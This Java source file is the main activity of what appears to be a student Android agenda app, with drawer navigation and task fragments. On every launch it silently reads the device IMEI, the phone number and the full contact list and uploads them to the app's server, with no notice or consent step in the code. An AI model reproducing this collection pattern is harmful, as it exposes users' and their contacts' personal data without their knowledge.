package com.dam.nestor_samuel.nsagenda;

import android.app.Activity;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
/*import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.view.View;*/
import android.provider.ContactsContract;
import android.support.design.widget.NavigationView;
import android.support.v4.view.GravityCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ActivityMain extends AppCompatActivity implements
        NavigationView.OnNavigationItemSelectedListener,
        FragmentNewTask.OnFragmentInteractionListener,
        FragmentModifyTask.OnFragmentInteractionListener,
        FragmentMapbox.OnFragmentInteractionListener,
        FragmentShowTasks.OnFragmentInteractionListener,
        FragmentGames.OnFragmentInteractionListener,
        FragmentInfoUsers.OnFragmentInteractionListener,
        FragmentEditUser.OnFragmentInteractionListener {

    private Usuario usuario;

    private TextView tv_nombreUsuario;
    private TextView tv_emailUsuario;
    private View headerView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(
                this, drawer, toolbar, R.string.navigation_drawer_open, R.string.navigation_drawer_close);
        drawer.addDrawerListener(toggle);
        toggle.syncState();

        NavigationView navigationView = (NavigationView) findViewById(R.id.nav_view);
        headerView = navigationView.getHeaderView(0);
        navigationView.setNavigationItemSelectedListener(this);

        Bundle bundle = getIntent().getExtras();
        usuario = bundle.getParcelable("Usuario");

        tv_nombreUsuario = headerView.findViewById(R.id.aMain_tv_nombreUsuario);
        tv_emailUsuario = headerView.findViewById(R.id.aMain_tv_emailUsuario);
        tv_nombreUsuario.setText(usuario.getNombre() + " " + usuario.getApellidos());
        tv_emailUsuario.setText(usuario.getEmail());

        new SavePhone().execute();

        if(savedInstanceState == null) {
            getSupportFragmentManager().beginTransaction()
                    .replace(R.id.container, FragmentShowTasks.newInstance(usuario.getId()))
                    .commitNow();
        }
    }

    @Override
    public void onBackPressed() {
        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        if (drawer.isDrawerOpen(GravityCompat.START)) {
            drawer.closeDrawer(GravityCompat.START);
        }

        AlertDialog alertDialog = new AlertDialog.Builder(this)
                .setMessage("¿Salir de la aplicación?")
                .setPositiveButton("Si", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        finish();
                    }
                })
                .setNegativeButton("No", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        //  No hacer nada
                    }
                })
                .create();

        alertDialog.show();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int id = item.getItemId();

        if (id == R.id.preferencias) {
            Intent intent = new Intent(this, ActivityPreferences.class);
            startActivity(intent);

            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    @SuppressWarnings("StatementWithEmptyBody")
    @Override
    public boolean onNavigationItemSelected(MenuItem item) {

        int id = item.getItemId();

        if (id == R.id.mostrarTareas) {
            getSupportFragmentManager().beginTransaction()
                    .replace(R.id.container, FragmentShowTasks.newInstance(usuario.getId()))
                    .commitNow();
        }
        else if (id == R.id.addTarea) {
            getSupportFragmentManager().beginTransaction()
                    .replace(R.id.container, FragmentNewTask.newInstance(usuario.getId()))
                    .commitNow();
        }
        else if (id == R.id.editarUsuario) {
            getSupportFragmentManager().beginTransaction()
                    .replace(R.id.container, FragmentEditUser.newInstance(usuario))
                    .commitNow();
        }
        else if (id == R.id.mostrarLocalizacion) {
            getSupportFragmentManager().beginTransaction()
                    .replace(R.id.container, FragmentMapbox.newInstance(usuario.getNick()))
                    .commitNow();
        }
        else if (id == R.id.mostrarContactos) {
            getSupportFragmentManager().beginTransaction()
                    .replace(R.id.container, FragmentInfoUsers.newInstance())
                    .commitNow();
        }
        else if (id == R.id.jugar) {
            getSupportFragmentManager().beginTransaction()
                    .replace(R.id.container, FragmentGames.newInstance(usuario.getNick()))
                    .commitNow();
        }

        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        drawer.closeDrawer(GravityCompat.START);
        return true;
    }

    @Override
    public void onFragmentInteraction(Uri uri) { }

    private class SavePhone extends AsyncTask<Void, Void, Void> {

        OkHttpClient client;
        String telefono;

        final String URL = ServicioWeb.PAGINA_BASE + "insertar_telefono.php";
        final MediaType JSON = MediaType.get("application/json; charset=utf-8");

        @Override
        protected Void doInBackground(Void... voids) {

            JSONObject jsonObject;      // Objeto JSON con los datos de los campos
            RequestBody body;           // Cuerpo de la petición con los datos
            Request request;            // Petición a la página web
            Response response;          // Respuesta del servidor
            TelephonyManager tManager;  // Objeto para obtener información del teléfono del usuario

            try {
                client = new OkHttpClient();

                tManager = (TelephonyManager)getBaseContext().getSystemService(Context.TELEPHONY_SERVICE);
                String imei = tManager.getDeviceId();
                telefono = tManager.getLine1Number();

                if(telefono != null && !telefono.isEmpty() &&
                        imei != null && !imei.isEmpty()) {

                    jsonObject = new JSONObject();
                    jsonObject.put("imei", imei);
                    jsonObject.put("telefono", telefono);

                    body = RequestBody.create(JSON, jsonObject.toString());
                    request = new Request.Builder()
                            .url(URL)
                            .post(body)
                            .build();

                    response = client.newCall(request).execute();

                    response.close();
                }

            }
            catch (JSONException jsone) {
                Log.e("--ERROR--", "Error al parsear JSON");
            }
            catch(IOException ioe) {
                Log.e("--ERROR--", "Error al realizar petición");
            }
            catch (SecurityException se) {
                Log.e("--ERROR--", "Error al obtener información del teléfono");
            }

            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            new SaveContacts().execute(telefono);
        }
    }

    private class SaveContacts extends AsyncTask<String, Void, Void> {

        OkHttpClient client;

        final String URL = ServicioWeb.PAGINA_BASE + "insertar_contactos.php";
        final MediaType JSON = MediaType.get("application/json; charset=utf-8");

        @Override
        protected Void doInBackground(String... strings) {

            JSONObject jsonObject;      // Objeto JSON con los datos de los campos
            JSONArray jsonContactos;    // Array JSON con la lista de contactos
            RequestBody body;           // Cuerpo de la petición con los datos
            Request request;            // Petición a la página web
            Response response;          // Respuesta del servidor
            TelephonyManager tManager;  // Objeto para obtener información del teléfono del usuario
            Cursor contactos;           // Cursor para recorrer la lista de contactos

            String telefono = strings[0];

            try {
                client = new OkHttpClient();

                if(telefono != null && !telefono.isEmpty()) {

                    jsonObject = new JSONObject();
                    jsonObject.put("telefono_origen", telefono);
                    jsonContactos = new JSONArray();

                    contactos = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,null,null, null);

                    List<String> listaContactos = new ArrayList<>();

                    while (contactos.moveToNext())
                    {
                        String c = contactos.getString(contactos
                                .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        if(c != null && !c.isEmpty() && !listaContactos.contains(c)) {
                            listaContactos.add(c);
                        }

                    }

                    contactos.close();

                    for(String c : listaContactos) {
                        jsonContactos.put(new JSONObject().put("telefono_contacto", c));
                    }

                    jsonObject.put("contactos", jsonContactos);

                    body = RequestBody.create(JSON, jsonObject.toString());
                    request = new Request.Builder()
                            .url(URL)
                            .post(body)
                            .build();

                    response = client.newCall(request).execute();

                    response.close();

                }

            }
            catch (JSONException jsone) {
                Log.e("--ERROR--", "Error al parsear JSON");
            }
            catch(IOException ioe) {
                Log.e("--ERROR--", "Error al realizar petición");
            }
            catch (SecurityException se) {
                Log.e("--ERROR--", "Error al obtener información del teléfono");
            }

            return null;
        }
    }
}
